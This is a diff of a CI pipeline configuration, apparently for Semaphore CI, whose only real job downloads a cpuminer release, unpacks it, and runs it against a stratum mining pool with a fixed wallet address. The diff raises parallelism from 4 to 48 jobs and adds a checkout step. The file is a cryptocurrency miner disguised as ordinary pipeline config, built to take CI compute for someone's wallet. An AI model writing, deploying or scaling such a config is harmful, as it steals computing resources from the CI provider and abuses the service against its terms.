@@ -6,15 +6,20 @@ agent:
     os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
-    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - checkout
+  - name: 'Block #3'
     task:
       jobs:
         - name: 'Job #1'
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
-          parallelism: 4
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t1'
+          parallelism: 48
 promotions:
   - name: Promotion 1
     pipeline_file: pipeline_2.yml
